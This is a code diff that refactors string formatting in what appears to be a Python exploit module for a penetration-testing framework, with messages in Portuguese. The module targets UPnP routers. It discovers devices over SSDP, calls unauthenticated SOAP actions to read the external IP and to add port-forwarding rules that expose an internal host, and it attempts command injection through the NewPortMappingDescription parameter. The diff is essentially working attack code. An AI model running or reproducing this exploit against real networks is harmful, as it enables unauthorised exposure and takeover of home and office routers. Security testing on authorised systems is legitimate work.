@@ -86,8 +86,8 @@ class Exploit(Exploit):
     def _msearch_pkt(self, st, host):
         return (
             "M-SEARCH * HTTP/1.1\r\n"
-            "HOST: {}\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: {}\r\n\r\n"
-        ).format(host, st).encode("utf-8")
+            f"HOST: {host}\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: {st}\r\n\r\n"
+        ).encode()
 
     def _udp_msearch(self, dest_ip, dest_port):
         results, seen = [], set()
@@ -100,7 +100,7 @@ class Exploit(Exploit):
                 sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
             except OSError:
                 pass
-        host_hdr = "{}:{}".format(dest_ip, dest_port)
+        host_hdr = f"{dest_ip}:{dest_port}"
         for st in _SEARCH_TARGETS:
             try:
                 sock.sendto(self._msearch_pkt(st, host_hdr), (dest_ip, dest_port))
@@ -149,8 +149,7 @@ class Exploit(Exploit):
     def _http_get(self, url):
         p = urlparse(url)
         host, port, path = p.hostname or "", p.port or 80, p.path or "/"
-        req = "GET {} HTTP/1.1\r\nHost: {}:{}\r\nConnection: close\r\nUser-Agent: UPnP/1.0\r\n\r\n".format(
-            path, host, port)
+        req = f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\nUser-Agent: UPnP/1.0\r\n\r\n"
         return self._raw_tcp(host, port, req.encode("utf-8"))
 
     def _soap(self, url, stype, action, args=""):
@@ -160,16 +159,16 @@ class Exploit(Exploit):
             '<?xml version="1.0" encoding="utf-8"?>'
             '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"'
             ' s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
-            '<s:Body><u:{a} xmlns:u="{t}">{g}</u:{a}></s:Body>'
+            f'<s:Body><u:{action} xmlns:u="{stype}">{args}</u:{action}></s:Body>'
             '</s:Envelope>'
-        ).format(a=action, t=stype, g=args)
+        )
         body = envelope.encode("utf-8")
         hdr = (
-            "POST {} HTTP/1.1\r\nHost: {}:{}\r\n"
+            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
             "Content-Type: text/xml; charset=\"utf-8\"\r\n"
-            "SOAPAction: \"{}#{}\"\r\nContent-Length: {}\r\n"
+            f"SOAPAction: \"{stype}#{action}\"\r\nContent-Length: {len(body)}\r\n"
             "Connection: close\r\n\r\n"
-        ).format(path, host, port, stype, action, len(body))
+        )
         return self._raw_tcp(host, port, hdr.encode("utf-8") + body)
 
     def _parse_xml_services(self, xml_body):
@@ -206,7 +205,7 @@ class Exploit(Exploit):
         """Tenta injeção de comandos via metacaracteres em parâmetros SOAP."""
         injected = []
         for payload in _INJECT_PAYLOADS:
-            args = "<NewPortMappingDescription>{}</NewPortMappingDescription>".format(payload)
+            args = f"<NewPortMappingDescription>{payload}</NewPortMappingDescription>"
             resp = self._soap(ctrl_url, stype, "AddPortMapping", args)
             if resp and ("200 OK" in resp or len(resp) > 50):
                 injected.append({"parameter": "NewPortMappingDescription", "payload": payload})
@@ -221,11 +220,11 @@ class Exploit(Exploit):
     @multi
     def run(self):
         dest = str(self.target) if self.target else _SSDP_MCAST
-        print_status("UPnP SSDP Discovery → {}".format(dest))
+        print_status(f"UPnP SSDP Discovery → {dest}")
 
         results = self._udp_msearch(dest, int(self.port))
         if not results:
-            print_error("Nenhum dispositivo UPnP descoberto em {}".format(dest))
+            print_error(f"Nenhum dispositivo UPnP descoberto em {dest}")
             return
 
         disc_headers = ["Location URL", "Server", "ST"]
@@ -242,7 +241,7 @@ class Exploit(Exploit):
             services = self._parse_xml_services(xml_body)
 
             p = urlparse(loc)
-            base_url = "{}://{}:{}".format(p.scheme, p.hostname, p.port or 80)
+            base_url = f"{p.scheme}://{p.hostname}:{p.port or 80}"
 
             for svc in services:
                 stype = svc.get("serviceType", "")
@@ -250,35 +249,35 @@ class Exploit(Exploit):
                     continue
                 ctrl = svc.get("controlURL", "")
                 if ctrl and not ctrl.startswith("http"):
-                    ctrl = "{}{}".format(base_url, ctrl)
+                    ctrl = f"{base_url}{ctrl}"
                 if not ctrl:
                     continue
                 svc_name = stype.split(":")[-2] if ":" in stype else stype
 
-                print_status("Testando GetExternalIPAddress em {}...".format(ctrl))
+                print_status(f"Testando GetExternalIPAddress em {ctrl}...")
                 resp = self._soap(ctrl, stype, "GetExternalIPAddress")
                 if resp:
                     ip_match = re.search(r"<NewExternalIPAddress>([\d.]+)</NewExternalIPAddress>", resp)
                     ext_ip = ip_match.group(1) if ip_match else "?"
-                    print_success("[CRÍTICO] GetExternalIPAddress sem auth: {}".format(ext_ip))
+                    print_success(f"[CRÍTICO] GetExternalIPAddress sem auth: {ext_ip}")
                     table_rows.append((dev_label, svc_name, "GetExternalIPAddress", ext_ip))
 
                 if self.inject_mapping:
                     fwd = str(self.forward_target) or str(self.target)
                     args = (
                         "<NewRemoteHost></NewRemoteHost>"
-                        "<NewExternalPort>{}</NewExternalPort>"
+                        f"<NewExternalPort>{self.forward_port}</NewExternalPort>"
                         "<NewProtocol>TCP</NewProtocol>"
-                        "<NewInternalPort>{}</NewInternalPort>"
-                        "<NewInternalClient>{}</NewInternalClient>"
+                        f"<NewInternalPort>{self.forward_internal_port}</NewInternalPort>"
+                        f"<NewInternalClient>{fwd}</NewInternalClient>"
                         "<NewEnabled>1</NewEnabled>"
                         "<NewPortMappingDescription>wxf_test</NewPortMappingDescription>"
                         "<NewLeaseDuration>0</NewLeaseDuration>"
-                    ).format(self.forward_port, self.forward_internal_port, fwd)
+                    )
                     ok = self._soap(ctrl, stype, "AddPortMapping", args)
                     if ok and "200" in str(ok):
-                        msg = "WAN:{} → {}:{}".format(self.forward_port, fwd, self.forward_internal_port)
-                        print_success("[CRÍTICO] AddPortMapping sem auth: {}".format(msg))
+                        msg = f"WAN:{self.forward_port} → {fwd}:{self.forward_internal_port}"
+                        print_success(f"[CRÍTICO] AddPortMapping sem auth: {msg}")
                         table_rows.append((dev_label, svc_name, "AddPortMapping", msg))
 
                 inj = self._try_injection(ctrl, stype)
